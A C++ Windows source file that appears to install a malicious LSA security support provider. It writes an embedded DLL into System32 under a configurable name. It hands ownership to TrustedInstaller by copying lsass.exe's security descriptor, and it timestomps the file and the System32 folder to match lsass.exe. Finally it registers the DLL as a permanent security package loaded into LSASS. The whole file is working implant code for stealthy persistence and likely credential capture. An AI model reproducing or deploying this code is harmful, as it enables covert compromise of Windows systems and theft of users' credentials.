#define SECURITY_WIN32
#include <Windows.h>
#include <sspi.h>
#include <aclapi.h>

#include "resource.h"

// stampable values - configured via web interface or helper script
constexpr wchar_t c_ProviderName[MAX_PATH] = L"BASKETBALLJONES";

#ifdef _DEBUG

#define DEBUG_PRINTW(_fmt, ...)               \
do {                                          \
    wchar_t _printbuf[MAX_PATH];              \
    wsprintfW(_printbuf, _fmt, __VA_ARGS__);  \
    OutputDebugStringW(_printbuf);            \
} while (0);

#else

#define DEBUG_PRINTW(...)

#endif

#define CLEANUP_IF_NOT_TRUE(_condition)                                     \
do {                                                                        \
    if (!(_condition)) {                                                    \
        DEBUG_PRINTW(L"line %d: error 0x%lx\n", __LINE__, GetLastError());  \
        goto cleanup;                                                       \
    }                                                                       \
} while (0);


BOOL SetOwnerToTrustedInstaller(LPWSTR filepath)
{
    BOOL retval = FALSE;

    HANDLE tokenHandle = NULL;
    TOKEN_PRIVILEGES privs;

    PSECURITY_DESCRIPTOR secdesc = nullptr;
    PSID owner = nullptr;
    PSID group = nullptr;
    PACL dacl = nullptr;
    PACL sacl = nullptr;

    // need to enable some privileges in the (administrator) token
    // doing them individually because copy/paste is lazier than allocating the struct to hold 3 privs
    CLEANUP_IF_NOT_TRUE(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenHandle));

    privs.PrivilegeCount = 1;
    privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    CLEANUP_IF_NOT_TRUE(LookupPrivilegeValueW(nullptr, SE_SECURITY_NAME, &privs.Privileges[0].Luid));
    CLEANUP_IF_NOT_TRUE(AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nullptr, nullptr));

    CLEANUP_IF_NOT_TRUE(LookupPrivilegeValueW(nullptr, SE_RESTORE_NAME, &privs.Privileges[0].Luid));
    CLEANUP_IF_NOT_TRUE(AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nullptr, nullptr));

    CLEANUP_IF_NOT_TRUE(LookupPrivilegeValueW(nullptr, SE_TAKE_OWNERSHIP_NAME, &privs.Privileges[0].Luid));
    CLEANUP_IF_NOT_TRUE(AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nullptr, nullptr));

    // copy security info from lsass exemplar
    CLEANUP_IF_NOT_TRUE(ERROR_SUCCESS ==
        GetNamedSecurityInfoW(L"C:\\Windows\\System32\\lsass.exe", SE_FILE_OBJECT,
            OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION | SACL_SECURITY_INFORMATION,
            &owner, &group, &dacl, &sacl, &secdesc));

    CLEANUP_IF_NOT_TRUE(ERROR_SUCCESS ==
        SetNamedSecurityInfoW(filepath, SE_FILE_OBJECT,
            OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION |
            SACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION | PROTECTED_SACL_SECURITY_INFORMATION,
            owner, group, dacl, sacl));

    retval = TRUE;

cleanup:
    if (tokenHandle) CloseHandle(tokenHandle);
    if (secdesc) LocalFree(secdesc);

    return retval;
}


BOOL MatchTimestampsToLsass(HANDLE targetfile)
{
    BOOL retval = FALSE;

    FILETIME created;
    FILETIME accessed;
    FILETIME modified;

    HANDLE lsass = NULL;

    lsass = CreateFileW(L"C:\\Windows\\System32\\lsass.exe",
        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, NULL);
    CLEANUP_IF_NOT_TRUE(lsass != INVALID_HANDLE_VALUE);

    CLEANUP_IF_NOT_TRUE(GetFileTime(lsass, &created, &accessed, &modified));
    CLEANUP_IF_NOT_TRUE(SetFileTime(targetfile, &created, &accessed, &modified));

    retval = TRUE;

cleanup:
    if (lsass) CloseHandle(lsass);

    return retval;
}


BOOL InstallProviderDll()
{
    BOOL retval = FALSE;

    LPVOID providerBin = nullptr;
    DWORD providerSize = 0;
    HRSRC resInfo = NULL;
    HANDLE dllHandle = NULL;
    wchar_t path[MAX_PATH];
    DWORD written = 0;
    HANDLE dirHandle = NULL;

    // load the provider DLL resource
    resInfo = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_BANG1), L"BANG");
    if (resInfo)
    {
        HGLOBAL res = LoadResource(NULL, resInfo);
        if (res)
        {
            providerSize = SizeofResource(NULL, resInfo);
            providerBin = LockResource(res);
        }
    }
    CLEANUP_IF_NOT_TRUE(providerBin);

    // write the provider DLL to disk
    wsprintfW(path, L"C:\\Windows\\System32\\%s.dll", c_ProviderName);
    dllHandle = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, NULL);
    CLEANUP_IF_NOT_TRUE(dllHandle != INVALID_HANDLE_VALUE);
    CLEANUP_IF_NOT_TRUE(WriteFile(dllHandle, providerBin, providerSize, &written, nullptr) && written == providerSize);

    // give file ownership to TrustedInstaller
    CLEANUP_IF_NOT_TRUE(SetOwnerToTrustedInstaller(path));

    // reset the file and directory timestamps
    dirHandle = CreateFileW(L"C:\\Windows\\System32", GENERIC_READ | FILE_WRITE_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS, NULL);
    CLEANUP_IF_NOT_TRUE(dirHandle != INVALID_HANDLE_VALUE);
    CLEANUP_IF_NOT_TRUE(MatchTimestampsToLsass(dllHandle));
    CLEANUP_IF_NOT_TRUE(MatchTimestampsToLsass(dirHandle));

    retval = TRUE;

cleanup:
    if (dllHandle) CloseHandle(dllHandle);
    if (dirHandle) CloseHandle(dirHandle);

    return retval;
}


int main()
{
    if (InstallProviderDll())
    {
        SECURITY_PACKAGE_OPTIONS opts;
        opts.Size = sizeof(opts);
        opts.Type = SECPKG_OPTIONS_TYPE_LSA;
        opts.Flags = SECPKG_OPTIONS_PERMANENT;  // undocumented - sets the registry value for us
        opts.SignatureSize = 0;
        opts.Signature = nullptr;
        AddSecurityPackageW(const_cast<wchar_t*>(c_ProviderName), &opts);
    }

    return 1;
}
